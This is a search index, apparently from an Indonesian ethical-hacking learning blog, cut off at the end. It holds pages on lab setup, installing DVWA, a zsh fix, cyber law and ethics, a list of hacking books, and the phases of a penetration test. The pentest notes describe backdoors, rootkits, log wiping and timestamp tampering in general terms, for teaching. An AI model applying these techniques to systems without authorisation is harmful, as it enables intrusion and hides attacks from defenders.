{"/about/":{"data":{"":"","apa-yang-bisa-anda-temukan#Apa yang Bisa Anda Temukan?":"Di Nancynesia, Anda akan menemukan:\nPanduan dan Tutorial: Langkah demi langkah untuk memahami berbagai topik terkait cybersecurity. Catatan Kursus dan Pengalaman: Berbagi pengalaman pribadi dan pembelajaran yang diperoleh dari kursus dan pelatihan. Tips dan Best Practices: Strategi dan saran untuk meningkatkan keterampilan di bidang keamanan siber. Materi Pendidikan Gratis: Semua informasi disediakan tanpa biaya, dengan tujuan mengakses pengetahuan tanpa hambatan finansial. Semoga informasi yang ada di Nancynesia dapat bermanfaat bagi semua pengunjung dan berkontribusi pada ekosistem keamanan siber yang lebih aman dan beretika.","credits#Credits":"Nancynesia tidak bisa dibuat tanpa alat dan inspirasi berikut:\nHugo Tailwind CSS Heroicons Nextra Next.js Hextra ","mengapa-nancynesia#Mengapa Nancynesia?":"Nancynesia dibuat dengan semangat untuk membagikan pengetahuan kepada masyarakat luas. Nama “Nancynesia” sendiri diharapkan dapat mencerminkan kekuatan kolaborasi di bidang keamanan siber di Indonesia. Melalui web ini, saya berharap dapat menjadi sumber informasi terpercaya yang membantu banyak orang memahami tantangan dan solusi di dunia cybersecurity.","tentang-nancynesia#Tentang Nancynesia":"Nancynesia, singkatan dari Keamanan Cyber Indonesia, merupakan platform yang dibuat untuk berbagi ilmu dan pengalaman seputar keamanan siber. Web ini lahir dari catatan pribadi saya yang diperoleh saat mengikuti kursus, menonton video, dan membaca berbagai artikel. Tujuan utama Nancynesia adalah untuk memberikan akses ke informasi berkualitas tanpa biaya, sehingga siapa pun dapat mempelajari dan memahami aspek-aspek penting dalam dunia cybersecurity tanpa perlu mengikuti kursus berbayar.","visi-dan-misi#Visi dan Misi":"Dengan Nancynesia, saya ingin membantu menghilangkan hambatan dalam belajar keamanan siber dan memberikan kesempatan yang sama bagi semua orang untuk mengembangkan keterampilan mereka. Semua materi yang tersedia di web ini disediakan secara gratis sebagai bentuk dedikasi untuk berbagi pengetahuan. Saya percaya bahwa dengan berbagi, kita bisa menciptakan komunitas yang lebih kuat dan saling mendukung.\nNamun, saya ingin menegaskan bahwa semua informasi ini harus digunakan untuk tujuan positif. Hacking untuk tujuan buruk adalah kejahatan yang harus dihindari, gunakan ilmu yang dipelajari untuk kebaikan, bukan untuk merugikan orang lain. Dengan memahami dan menerapkan prinsip etika, kita bisa memastikan bahwa keamanan siber tetap menjadi bidang yang melindungi, bukan merusak."},"title":"About Me"},"/blog/fix-syntax-highlighting-terminal-kali-linux/":{"data":{"":" ","langkah-untuk-menambahkan-zsh-syntax-highlighting#Langkah untuk Menambahkan ZSH Syntax Highlighting":"Berikut adalah langkah-langkah untuk menambahkan zsh-syntax-highlighting di Zsh agar fitur syntax highlighting dapat aktif:\n1. Instal zsh-syntax-highlighting\rPastikan zsh-syntax-highlighting diinstal terlebih dahulu. Jalankan perintah berikut di terminal Anda:\nsudo apt install zsh-syntax-highlighting\r2. Tambahkan source di ~/.zshrc\rUntuk mengaktifkan zsh-syntax-highlighting, buka file ~/.zshrc dengan editor teks favorit Anda, misalnya nano atau vim:\nnano ~/.zshrc\rKemudian tambahkan baris berikut di akhir file ~/.zshrc:\nsource /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\rSimpan dan tutup file tersebut. (Jika menggunakan nano, tekan CTRL + X, lalu Y, dan tekan Enter).\n3. Terapkan Perubahan\rSetelah menambahkan baris tersebut, jalankan perintah berikut agar perubahan diterapkan:\nsource ~/.zshrc\r4. Mengatasi Error Jika Menggunakan Bash\rJika Anda mendapatkan error saat menjalankan source ~/.zshrc, berarti Anda mungkin menggunakan shell bash, bukan zsh. Berikut solusi untuk masalah ini:\nMasuk ke Zsh: Anda perlu memastikan bahwa Anda menjalankan shell zsh saat mengaktifkan konfigurasi ~/.zshrc. Jika Anda menggunakan bash, perintah-perintah Zsh tidak akan dikenali. Cobalah untuk masuk ke Zsh dengan mengetikkan perintah berikut di terminal:\nzsh\rJalankan source ~/.zshrc: Setelah masuk ke Zsh, jalankan:\nsource ~/.zshrc\r5. Instal Zsh dan Ubah Shell Default\rJika Zsh belum diinstal, instal dengan perintah berikut:\nsudo apt install zsh\rKemudian ubah shell default Anda menjadi Zsh dengan perintah:\nchsh -s $(which zsh)\rLog out dan log in kembali untuk menerapkan perubahan ini.","mengapa-masalah-ini-terjadi#Mengapa Masalah Ini Terjadi?":"Perbedaan Sintaks\rBash dan Zsh memiliki perbedaan sintaks dan fitur. Perintah seperti autoload, compinit, dan zstyle adalah spesifik untuk Zsh, sehingga tidak akan dikenali oleh bash.\nFile Konfigurasi\r~/.zshrc adalah file konfigurasi untuk Zsh, sedangkan bash menggunakan ~/.bashrc atau ~/.bash_profile."},"title":"Fix Syntax Highlighting tidak aktif di Terminal Kali Linux"},"/blog/hands-on_setup_lab_dan_lingkungan_testing_aman/":{"data":{"":"Menjelaskan bagaimana cara setup Lab yang baik, referensi dari course ITTS Ethical Hackers\nTags: [[hacking_fundamentals]]","1-memahami-komponen-utama#1. Memahami Komponen Utama":" Ubuntu 24.04: Digunakan sebagai OS utama untuk host karena stabilitas dan fleksibilitasnya. Kali Linux 2024.3: Sebagai distro khusus pengujian penetrasi dengan beragam tools bawaan. GNS3: Emulator jaringan untuk membangun topologi kompleks dan simulasi serangan/pertahanan. ","2-langkah-langkah-setup#2. Langkah-langkah Setup":"i. Instalasi Ubuntu 24.04\rUnduh ISO dari situs resmi Ubuntu. Buat media bootable (USB atau DVD) dan instal Ubuntu pada perangkat keras Anda. ii. Instalasi Kali Linux (Opsional)\rUnduh ISO Kali Linux 2024.3 dari situs resmi. Instal pada VM menggunakan software virtualisasi seperti VirtualBox atau VMware. iii. Instalasi GNS3\rUnduh dan instal GNS3 dari situs resminya. Konfigurasikan agar GNS3 dapat bekerja dengan VM Anda (misalnya untuk menghubungkan Kali Linux di dalam VM). iv. Konfigurasi Jaringan\rPastikan mesin host dan VM dapat berkomunikasi. Stabilkan koneksi internet untuk mengunduh tools dan update. v. Instalasi Tools\rDi Kali Linux: Sebagian besar tools untuk ethical hacking sudah tersedia secara default. Di Ubuntu: Instal tools melalui apt, seperti: Nmap: Untuk pemindaian jaringan. Metasploit: Framework eksploitasi. Wireshark: Analisis lalu lintas jaringan. John the Ripper: Cracking password. Burp Suite: Pengujian aplikasi web. vi. Membangun Topologi Jaringan di GNS3\rTambahkan perangkat jaringan seperti router, switch, firewall di GNS3. Konfigurasikan perangkat dan hubungkan sesuai kebutuhan topologi. ","3-contoh-topologi-sederhana#3. Contoh Topologi Sederhana":" Host: Kali Linux (mesin attacker). Target: Ubuntu Server (mesin target). Router: Mikrotik di GNS3. Switch: Built-in switch di GNS3. ","4-lingkungan-testing-aman#4. Lingkungan Testing Aman":" Isolasi Jaringan: Pisahkan dari jaringan produksi. Firewall: Batasi akses ke layanan tertentu. IDS (Intrusion Detection System): Pantau aktivitas jaringan. Virtualisasi: Isolasi setiap eksperimen untuk meminimalkan risiko. Backup: Lakukan backup secara berkala. ","5-hands-on-aktivitas#5. Hands-On Aktivitas":" Scanning Jaringan: Gunakan Nmap untuk memindai dan mengidentifikasi perangkat. Eksploitasi Kerentanan: Gunakan Metasploit pada kerentanan yang ditemukan. Analisis Traffic: Gunakan Wireshark untuk melihat pola traffic. Password Cracking: Gunakan John the Ripper. Web Application Hacking: Uji aplikasi web menggunakan Burp Suite. ","6-tips-tambahan#6. Tips Tambahan":" Pelajari Dasar-Dasar Jaringan untuk memahami lebih baik. Ikuti Tutorial dan Dokumentasi terkait tools yang digunakan. Praktikkan Secara Teratur untuk meningkatkan keterampilan. Etika: Selalu patuhi hukum dan prinsip ethical hacking. ","7-penting#7. Penting":" Jangan menyerang sistem tanpa izin. Patuhi kebijakan keamanan yang berlaku. "},"title":"Hands-on Setup Lab dan Lingkungan Testing Aman"},"/blog/instalasi-lab-dvwa/":{"data":{"":"","apa-itu-dvwa#Apa itu DVWA?":"DVWA atau Damn Vulnerable Web Application, merupakan web yang memang sengaja dibuat rentan untuk tujuan praktik hacking. Hacker pemula bisa belajar disini untuk menguji kemampuanya dengan mengeksplorasi kerentanan yang ada.","cara-instalasi-dvwa-dengan-docker#Cara Instalasi DVWA dengan Docker:":" Install Docker terlebih dahulu jika belum terpasang. Langkahnya instalasi bisa ke web official Docker\nClone repository DVWA:\ngit clone https://github.com/digininja/DVWA.git\rMasuk ke folder DVWA:\ncd DVWA\rJalankan DVWA dengan Docker Compose:\ndocker compose up -d\rAkses DVWA melalui browser di port yang disediakan (misalnya, http://localhost).\nLogin menggunakan username admin dan password password.\nPastikan minimal setup check sudah berhasil dan berwarna hijau, lalu klik “Create” atau “Reset Database”.\nSetelah berhasil, Anda akan diarahkan ke halaman admin.","tujuan-dvwa#Tujuan DVWA":"Tujuanya adalah untuk membuat area praktik hacking yang legal, karena web ini memang dengan sengaja dibuat untuk kebutuhan praktik cybersecurity. DVWA sendiri dibuat dengan berbagai macam tingkat kesulitan yang bisa di pilih saat didalam web nantinya."},"title":"Instalasi Lab DVWA"},"/blog/markdown/":{"data":{"":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files.","basic-syntax#Basic Syntax":"Headings\r# Heading 1 ## Heading 2 ### Heading 3 #### Heading 4 ##### Heading 5 ###### Heading 6","heading-2#Heading 2":"Heading 3\rHeading 4\rHeading 5\rHeading 6\rEmphasis\r*This text will be italic* _This will also be italic_ **This text will be bold** __This will also be bold__ _You **can** combine them_\rThis text will be italic\nThis will also be italic\nThis text will be bold\nThis will also be bold\nYou can combine them\nLists\rUnordered\r* Item 1 * Item 2 * Item 2a * Item 2b\rItem 1 Item 2 Item 2a Item 2b Ordered\r1. Item 1 2. Item 2 3. Item 3 1. Item 3a 2. Item 3b\rImages\r![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)\rLinks\r[Hugo](https://gohugo.io)\rHugo\nBlockquotes\rAs Newton said: \u003e If I have seen further it is by standing on the shoulders of Giants.\rIf I have seen further it is by standing on the shoulders of Giants.\nInline Code\rInline `code` has `back-ticks around` it.\rInline code has back-ticks around it.\nCode Blocks\rSyntax Highlighting\r```go func main() { fmt.Println(\"Hello World\") } ```\rfunc main() { fmt.Println(\"Hello World\") }\rTables\r| Syntax | Description | | --------- | ----------- | | Header | Title | | Paragraph | Text |\rSyntax Description Header Title Paragraph Text ","references#References":" Markdown Syntax Hugo Markdown "},"title":"Markdown Syntax Guide"},"/blog/mengapa-kita-perlu-melakukan-penetration-testing/":{"data":{"":" ","mengapa-perlu-pentest#Mengapa Perlu Pentest":"Sebagai pengingat, istilah ethical hacker menggambarkan seseorang yang bertindak seperti penyerang dan mengevaluasi keamanan jaringan komputer dengan tujuan meminimalkan risiko. NIST Computer Security Resource Center (CSRC) mendefinisikan seorang hacker sebagai “pengguna tidak sah yang mencoba atau berhasil mengakses sistem informasi.” Istilah hacker telah digunakan dengan berbagai cara dan memiliki banyak definisi. Kebanyakan orang di bidang teknologi komputer menganggap diri mereka sebagai hacker hanya karena mereka suka mengutak-atik sesuatu, yang jelas bukan hal yang jahat.\nFaktor kunci dalam membedakan ethical hacking dan nonethical hacking adalah bahwa yang terakhir melibatkan niat jahat. Izin untuk menyerang atau melakukan pengujian adalah hal yang penting dan akan melindungi Anda dari masalah! Izin ini sering disebut sebagai scope (cakupan) dari pengujian, yang menentukan apa yang boleh dan tidak boleh diuji.\nSeorang peneliti keamanan yang mencari celah dalam produk, aplikasi, atau layanan web dan melaporkan temuan mereka kepada vendor atau pemilik layanan tersebut dianggap sebagai ethical hacker. Namun, seseorang yang menggunakan celah keamanan untuk mendapatkan akses tidak sah akan dianggap sebagai nonethical hacker. Bahkan, seseorang yang menemukan celah dan mempublikasikannya tanpa berkolaborasi dengan vendor juga dianggap nonethical karena bisa memicu kompromi jaringan/sistem oleh pihak lain yang berniat jahat.\nSebagai ethical hacker, Anda menggunakan alat yang sama untuk menemukan celah dan mengeksploitasi target seperti yang digunakan oleh nonethical hackers. Namun, sebagai ethical hacker, Anda melaporkan temuan Anda kepada vendor atau pelanggan untuk membantu meningkatkan keamanan jaringan. Anda juga menghindari melakukan uji atau eksploitasi yang dapat merusak.\nTujuan ethical hacker adalah menganalisis postur keamanan dari infrastruktur jaringan atau sistem untuk mengidentifikasi dan mungkin mengeksploitasi kelemahan keamanan. Proses ini dikenal sebagai security penetration testing atau ethical hacking.\nJadi, mengapa kita perlu melakukan penetration testing? Pertama-tama, sebagai seseorang yang bertanggung jawab untuk mengamankan dan mempertahankan jaringan/sistem, Anda ingin menemukan jalur kemungkinan serangan sebelum para peretas jahat melakukannya. Selama bertahun-tahun, kita telah mengembangkan dan menerapkan berbagai teknik pertahanan, seperti antivirus, firewall, intrusion prevention systems (IPS), dan anti-malware. Kita juga telah menerapkan konsep defense-in-depth untuk mengamankan dan mempertahankan jaringan.\nNamun, bagaimana kita tahu apakah pertahanan itu benar-benar efektif dan cukup untuk menahan serangan? Seberapa berharganya data yang kita lindungi, dan apakah kita melindungi hal-hal yang tepat? Pertanyaan-pertanyaan ini harus dijawab melalui penetration test.\nContohnya, jika Anda membangun pagar di sekitar halaman dengan tujuan agar anjing Anda tidak keluar, mungkin cukup dengan pagar setinggi 4 kaki. Namun, jika Anda khawatir bukan hanya anjing keluar, tetapi juga penyusup masuk, Anda memerlukan pagar yang lebih tinggi dan lebih aman, mungkin dengan kawat berduri di atasnya untuk menghalau penjahat. Dalam keamanan informasi, kita perlu melakukan penilaian yang serupa terhadap jaringan dan sistem kita. Kita harus menentukan apa yang kita lindungi dan apakah pertahanan kita cukup kuat untuk menahan ancaman yang ada.\nInilah pentingnya penetration testing. Menerapkan firewall, IPS, anti-malware, VPN, dan web application firewall (WAF) saja tidak cukup. Anda juga perlu menguji keabsahannya secara berkala, karena jaringan dan sistem berubah terus-menerus, sehingga permukaan serangan pun dapat berubah. Ketika ini terjadi, Anda perlu mempertimbangkan untuk mengevaluasi kembali postur keamanan melalui penetration test."},"title":"Mengapa Kita Perlu Melakukan Penetration Testing"},"/blog/top-hacking-books-for-2024/":{"data":{"":"","#":"Rekomendasi Buku Hacking 2024\nReferences: David Bombal\nHow To Hack Like A Legend : Sparc Flow Ethical Hacking: A Hand-On Introduction To Breaking in Daniel G. Graham Linux Basic For Hackers: Occuphytheweb Extreme Privacy: Michael Bazzel\n1. The Web Application Hackers Handbook: Finding and Exploiting Security Flaws 2nd Edition by Dafydd Stuttard\rDiterbitkan pertama tahun 2011, dimana internet sendiri masih belum rumit seperti sekarang. Sangat rekomendasi untuk belajar tingkat dasar kerentanan suatu sistem. Beberapa kerentanan keamanan yang baru mungkin tidak ada dibuku ini, tapi ini sangat membantu untuk belajar keamanan dasar bagi pemula. Ditulis oleh Dafydd Stuttard -\u003e Bekerja di portswigger yang membuat Burpsuite Penulis kedua Marcus Pinto -\u003e Owner dari MDSec, salah satu best company di UK 2. Portswigger Web Security Academy\rVersi ketiga dari bukunya Dafydd Stutard Link web: https://portswigger.net Disitu terdapat beberapa kerentanan dan tipe serangan yang sedang tren saat ini Selain itu disini juga terdapat lab, untuk praktik melakukan serangan Salah satu resources yang terbaik untuk web app hacking Gratis 3. OWASP Testing Guide\rBerisi panduan menyeluruh tentang pentesting web application Link web: https://owasp.org/www-project-web-security-testing-guide/ Di web tersebut juga ada versi pdf nya untuk yang saat ini, versi pdf 4.2, bisa download gratis disana Kekuranganya adalah terlalu padat isinya, kadang lebih baik menggunakan cheatsheet Selain itu ada juga github repository nya, yang kita bisa mudah mencari topik tertentu mengenai hacking 4. Real World Bug Hunting by Peter Yaworski\rAuthornya sendiri adalah bug bounty hunter yang terkenal hingga saat ini Bukunya berisi kerentanan web yang ada di situs web yang nyata seperti Uber Menyajikan pengalaman nyata yang terjadi di dunia nyata 5. Bug Bounty Bootcamp by Vickie Li\rSedikit lebih baru dari bukunya Peter Banyak resource mengenai Web Bug Bounty disini Banyak Metodologi Reconnaisance disini Rekomendasi untuk orang yang tertarik dengan Bug Bounty atau Web Hacking 6. Red Team Field Manual by Ben Clark \u0026 Nick Downer\rSedikit ketinggalan jaman Kumpulan sintaks untuk red team Banyak materi Poweshell, Bash untuk membuat script sendiri 7. Red Team Development And Operations by Joe Vest\rBerisi tentang bagaimana bekerja dengan tim Manajemen tim Rekomendasi untuk orang yang sedang merintis Red Tim sendiri 8. Operators Handbook by Netmux\rIsi dari buku mencakup Red, Blue, OSINT Berisi sintaks juga sama seperi Buku di atas 9. Tribe Of Hackers Red Team by Marcus J.Carey \u0026 Jenifer Jin\rLebih membicarakan mengenai asal usul Tentang langkah apa yang mereka ambil, Bagaimana cara memulai karir, dll 10. Pentester Blueprint by Philip L.Wylie\rBagaimana anda memulai karir di ofensive siber sekuriti 11. Osint Technique: Resource For Uncovering Online Information by Michael Bazzel\rMichael sendiri dikenal sebagai bapak OSINT Buku ke-10 dari pak Michael Salah satu resources terbaik untuk OSINT 12. Evading EDR by Matt Hand\rPanduan Bypass Defeating Endpoint Detection System 13. Black Hat Graphql by Nick Aleks\rBerisi mengenai API Attack 14. Hacking API by Corey J.Ball\rAPI hacking book Fokus pada API 15. Black Hat Go by Tom Steele\rKetika belajar hacking, kita tidak perlu belajar frontend atau backend, tapi belajar bagaimana cara menulis script, maka dari itu perlu buku ini. Untuk saat ini banyak alat yang dibuat dengan bahasa Go 16. Black Hat Python by Justin Seitz 2n Editions\rSangat rekomendasi untuk pemula Untuk pemula bisa belajar ini dulu baru ke bahasa GO 17. Black Hat Bash by Dolev Fahri\rBash scripting for Hackers And Pentester 18. Zseno’s Methodology\rZseano adalah salah satu peretas handal di hackerone Bug Bounty Pendekatan bagaimana cara menemukan bug "},"title":"Top Hacking Books for 2024"},"/docs/":{"data":{"":"Di sini, Anda akan menemukan berbagai catatan, panduan, dan tutorial yang saya tulis untuk membantu Anda memahami berbagai topik teknologi. Dari cybersecurity hingga pemrograman dan pengembangan keterampilan lainya.\nCodingBelajar dan eksplorasi dunia pemrograman. HackingPanduan mendalam untuk cybersecurity dan ethical hacking. LifestyleCatatan seputar gaya hidup yang inspiratif dan produktif. LifehackTrik dan tips untuk meningkatkan efisiensi dan kualitas hidup. "},"title":"Notes"},"/docs/coding/":{"data":{"":"Selamat datang di halaman Coding! Di sini Anda akan menemukan berbagai catatan, panduan, dan tutorial seputar pemrograman. Dari pengembangan aplikasi hingga pengelolaan basis data, halaman ini dirancang untuk membantu Anda mendalami berbagai topik coding.","daftar-isi#Daftar Isi":" android_projects android_studio_jetpack_compose coding_tools computational devops_fundamentals java_oop mysql php_oop python_fundamentals "},"title":"Coding"},"/docs/coding/python_fundamentals/":{"data":{"":"Halaman ini mencakup dasar-dasar bahasa pemrograman Python. Anda akan menemukan panduan, contoh, dan tutorial sederhana yang dirancang untuk membantu pemula memahami konsep utama Python.","daftar-isi#Daftar Isi":" Python Hello World "},"title":"Python Fundamental"},"/docs/coding/python_fundamentals/python_hello_world/":{"data":{"":"","hello-world#Hello World!":"The “Hello World!” is a simple program that outputs Hello World! to the screen.\nIn Python, we use print() to show words on the screen. The words go inside quotation marks.\nLet’s take a look at the “Hello World!” program in Python:\nprint(\"Hello World!\")","introduction#Introduction":"Python is one of the world’s easiest and most popular programming languages. This course will teach you the basics of Python, without requiring any prior knowledge.\nhello.pyprint(\"Hello Python!\")"},"title":"Python Hello World"},"/docs/hacking/":{"data":{"":"Selamat datang di halaman Hacking! Halaman ini menyajikan berbagai catatan, panduan, dan tutorial terkait dunia hacking dan keamanan siber. Dari teknik dasar hingga strategi lanjutan, kami menyediakan materi yang bertujuan untuk meningkatkan pemahaman Anda tentang pengujian keamanan, eksploitasi, serta cara-cara melindungi sistem dari potensi ancaman.","daftar-isi#Daftar Isi":" Hacking Fundamental "},"title":"Hacking"},"/docs/hacking/hacking_fundamentals/":{"data":{"":"Halaman ini berisi panduan dan materi tentang dasar-dasar hacking dan keamanan siber. Di sini, Anda akan menemukan tutorial, contoh kasus, dan penjelasan tentang prinsip-prinsip fundamental hacking, termasuk pemrograman untuk keamanan, memahami celah keamanan, serta teknik-teknik yang digunakan untuk mengidentifikasi dan mengatasi potensi risiko.","daftar-isi#Daftar Isi":" Definisi Ethical Hacking Dunia Bawah di Internet Etika dan Hukum Terkait Hacking Fase Penetration Testing Metodologi Pentesting Peran dan Tanggung Jawab Ethical Hacker Perangkat Tool dan Lingkungan Kerja (VM, Kali Linux) Sejarah Internet Indonesia Memahami Command Injection Memahami File Inclusion Instalasi Lab DVWA Memahami CSRF "},"title":"Hacking Fundamental"},"/docs/hacking/hacking_fundamentals/definisi_ethical_hacking/":{"data":{"":"","apa-itu-ethical-hacking#Apa itu Ethical Hacking":"Ibaratnya seorang dokter yang memeriksa pasienya, begitu juga dengan ethical hacker itu sendiri, seperti dokter yang memeriksa penyakit komputer. Definisi khususnya, Ethical Hacking adalah praktik penggunaan teknik hacking untuk mengidentifikasi dan memperbaiki kerentanan, keamanan pada suatu sistem.","contoh-kegiatan-dalam-kuliah-ethical-hacking#Contoh Kegiatan dalam Kuliah Ethical Hacking":" Mempelajari Teori Praktik Mengerjakan Tugas Proyek ","kenapa-kita-perlu-belajar#Kenapa Kita Perlu Belajar":" Mencegah serangan: Dengan memahami teknik serangan, maka tahu cara bertahan Memperbaiki sistem: Kita bisa menemukan dan memperbaiki kerentanan sebelum diserang hacker jahat Meningkatkan keamanan siber: Menjadikan dunia digital lebih aman ","yang-akan-dipelajari#Yang akan dipelajari":" Dasar keamanan komputer Jenis serangan Tool Hacking Metode Pengujian Etika dalam hacking "},"title":"Definisi Ethical Hacking"},"/docs/hacking/hacking_fundamentals/dunia_bawah_di_internet/":{"data":{"":" Dunia Underground di Internet: Seperti di dunia nyata, terdapat komunitas yang menolak hukum konvensional, lebih fokus pada keterbukaan informasi, dan menilai individu berdasarkan kemampuan, bukan status sosial. Komunitas ini sering terhubung dengan etos hacking yang berbasis pada ilmu komputer dan berbagi pengetahuan secara bebas.\nPerbedaan Hacker vs Cracker:\nHacker: Individu yang ahli dalam pemrograman dan jaringan, seringkali mencari solusi kreatif tanpa niat merusak. Cracker: Individu yang melakukan pembobolan keamanan dengan niat merusak atau mencuri data, seringkali digambarkan secara negatif oleh media. Karakteristik Hacker:\nSuka belajar dan menguasai sistem secara detail. Menikmati tantangan dalam pemrograman dan menghargai karya hacker lain. Terampil dan cepat beradaptasi dengan teknologi baru. Pengakuan dalam Dunia Hacker: Status diakui berdasarkan keahlian, bukan umur. Pengakuan diperoleh lewat kontribusi nyata seperti eksploitasi kelemahan sistem, menulis tutorial, dan aktif dalam diskusi komunitas.\nKode Etik Hacker: Beberapa prinsip utama, seperti menghormati pengetahuan, tidak merusak sistem yang diakses, dan berbagi informasi secara terbuka, membedakan hacker dari perilaku destruktif.\nStrata Hacker:\nTingkat tertinggi dikenal sebagai ‘Elite’, yang memiliki kemampuan tinggi dalam jaringan dan pemrograman. Di sisi bawah, terdapat ‘Lamer’ atau ‘Script Kiddie’, yang hanya memiliki pengetahuan dangkal dan seringkali berfokus pada aktivitas ilegal atau destruktif. "},"title":"Dunia Bawah di Internet"},"/docs/hacking/hacking_fundamentals/etika_dan_hukum_terkait_hacking/":{"data":{"":"","1-legalitas-hacking#1. Legalitas Hacking":" Hukum di Indonesia:\nUU ITE (Undang-Undang Informasi dan Transaksi Elektronik): Mengatur kejahatan siber seperti akses tanpa izin, perusakan data, dan gangguan sistem komputer. UU PDP (Undang-Undang Perlindungan Data Pribadi): Mengatur pengelolaan data pribadi, termasuk dalam pengujian keamanan, untuk memastikan tidak ada pelanggaran privasi selama proses ethical hacking. KUHP (Kitab Undang-Undang Hukum Pidana): Mengatur tindak pidana terkait kejahatan komputer, seperti pencurian atau penipuan. Hukum Internasional: Setiap negara memiliki peraturan terkait kejahatan siber yang dapat berbeda, tetapi umumnya melarang tindakan hacking yang merugikan pihak lain.","2-etika-dalam-hacking#2. Etika dalam Hacking":" Golden Rule: Jangan melakukan sesuatu yang tidak ingin Anda alami sendiri. Persetujuan: Selalu mendapatkan izin sebelum melakukan pengujian. Kerahasiaan: Menjaga informasi yang diperoleh selama pengujian. Tanggung Jawab: Bertindak dengan bertanggung jawab dan melaporkan kerentanan yang ditemukan. ","3-hukum-dalam-ethical-hacking#3. Hukum dalam Ethical Hacking":" Pengujian Penetrasi: Dilakukan dengan perjanjian yang mencakup ruang lingkup dan tanggung jawab. Setelah pengujian, ethical hacker harus membuat laporan temuan. Perbedaan Ethical Hacking vs. Hacking Ilegal: Tujuan: Ethical hacking bertujuan menemukan dan memperbaiki kelemahan, sementara hacking ilegal bertujuan merugikan. Izin: Ethical hacking dilakukan dengan izin, sementara hacking ilegal tidak. Tanggung Jawab: Ethical hacker bertanggung jawab atas tindakan mereka, sementara hacker ilegal berusaha menyembunyikan jejak. ","4-contoh-kasus#4. Contoh Kasus":" White Hat: Melaporkan kerentanan pada situs e-commerce. Black Hat: Membobol sistem perbankan untuk mencuri data. Gray Hat: Memublikasikan kerentanan tanpa izin dari pemilik sistem. ","kesimpulan#Kesimpulan":"Ethical hacking bermanfaat jika dilakukan sesuai dengan hukum dan etika. Penting untuk memahami dampak tindakan terhadap orang lain, selalu bertindak dengan bijak, dan terus memperbarui pengetahuan tentang hukum yang berlaku.","poin-penting#Poin Penting":" Hukum siber terus berkembang: Tetap update dengan peraturan terkini. Konsultasi dengan Ahli Hukum: Jika ragu, konsultasikan legalitas suatu tindakan. Ikuti Kode Etik: Mengikuti kode etik profesi untuk memastikan tindakan etis. "},"title":"Etika dan Hukum Terkait Hacking"},"/docs/hacking/hacking_fundamentals/fase-penetration-testing/":{"data":{"":"","#":"Penetration testing atau uji penetrasi merupakan simulasi serangan siber yang bertujuan untuk mengidentifikasi dan memperbaiki kelemahan keamanan dalam sistem komputer. Penetration testing dilakukan secara etis dan dengan izin pemilik sistem agar kerentanan yang ditemukan dapat ditangani sebelum dieksploitasi oleh pihak tidak bertanggung jawab. Berikut adalah penjelasan mengenai fase-fase utama dalam penetration testing:\n1. Reconnaissance (Pengumpulan Informasi)\rTujuan: Mengumpulkan sebanyak mungkin informasi tentang target sebelum melancarkan serangan. Metode: Passive Reconnaissance: Mengamati target tanpa melakukan kontak langsung, seperti mengakses informasi yang tersedia secara publik (website, media sosial, DNS). Active Reconnaissance: Melibatkan interaksi langsung dengan sistem target seperti ping atau scanning port. Tools Umum: Whois untuk mendapatkan informasi registrasi domain. Shodan untuk memindai perangkat yang terhubung ke internet. Google Hacking untuk mengungkap data atau dokumen sensitif. 2. Scanning (Pemindaian)\rTujuan: Mengidentifikasi layanan, port yang terbuka, dan potensi kerentanan di sistem target. Jenis Pemindaian: Port Scanning: Mengidentifikasi port terbuka dan layanan yang berjalan di atasnya. Vulnerability Scanning: Memindai sistem untuk menemukan kerentanan yang diketahui menggunakan database keamanan. Tools Umum: Nmap untuk pemindaian port. Nessus dan OpenVAS untuk pemindaian kerentanan. 3. Gaining Access (Mendapatkan Akses)\rTujuan: Mengeksploitasi kerentanan yang ditemukan dalam fase sebelumnya untuk mendapatkan akses ke sistem target. Teknik Umum: SQL Injection: Mengeksploitasi input yang tidak tervalidasi dalam query database. Cross-Site Scripting (XSS): Menyuntikkan skrip berbahaya ke halaman web. Buffer Overflow: Mengeksploitasi batas buffer dalam memori aplikasi. Tools Umum: Metasploit Framework untuk eksploitasi otomatis. 4. Maintaining Access (Menjaga Akses)\rTujuan: Setelah mendapatkan akses, penyerang berusaha untuk mempertahankan akses tersebut agar dapat mengakses sistem target di masa depan. Teknik Umum: Backdoors: Menyisipkan pintu belakang yang memungkinkan akses ulang di kemudian hari. Rootkits: Mengubah kernel sistem untuk menyembunyikan aktivitas penyerang. Persistence Mechanisms: Menggunakan layanan yang terus berjalan atau modifikasi file sistem. 5. Covering Tracks (Menyembunyikan Jejak)\rTujuan: Menghapus atau menyamarkan jejak aktivitas agar tidak terdeteksi. Teknik Umum: Log Wiping: Menghapus atau memodifikasi log aktivitas di sistem target. Timestamp Modification: Mengubah waktu modifikasi file agar tidak terlihat mencurigakan. File Hiding: Menyembunyikan file penting yang berkaitan dengan serangan. Dengan memahami setiap fase dalam penetration testing, tim keamanan dapat mengambil langkah-langkah pencegahan yang sesuai, seperti memperkuat jaringan, melakukan pemantauan aktif, serta meningkatkan kesadaran tentang ancaman siber. Langkah ini akan membantu mencegah dan meminimalkan dampak dari potensi serangan."},"title":"Fase Penetration Testing"},"/docs/hacking/hacking_fundamentals/instalasi-lab-dvwa/":{"data":{"":"","apa-itu-dvwa#Apa itu DVWA?":"DVWA atau Damn Vulnerable Web Application, merupakan web yang memang sengaja dibuat rentan untuk tujuan praktik hacking. Hacker pemula bisa belajar disini untuk menguji kemampuanya dengan mengeksplorasi kerentanan yang ada.","cara-instalasi-dvwa-dengan-docker#Cara Instalasi DVWA dengan Docker:":" Install Docker terlebih dahulu jika belum terpasang. Langkahnya instalasi bisa ke web official Docker\nClone repository DVWA:\ngit clone https://github.com/digininja/DVWA.git\rMasuk ke folder DVWA:\ncd DVWA\rJalankan DVWA dengan Docker Compose:\ndocker compose up -d\rAkses DVWA melalui browser di port yang disediakan (misalnya, http://localhost).\nLogin menggunakan username admin dan password password.\nPastikan minimal setup check sudah berhasil dan berwarna hijau, lalu klik “Create” atau “Reset Database”.\nSetelah berhasil, Anda akan diarahkan ke halaman admin.","tujuan-dvwa#Tujuan DVWA":"Tujuanya adalah untuk membuat area praktik hacking yang legal, karena web ini memang dengan sengaja dibuat untuk kebutuhan praktik cybersecurity. DVWA sendiri dibuat dengan berbagai macam tingkat kesulitan yang bisa di pilih saat didalam web nantinya."},"title":"Instalasi Lab 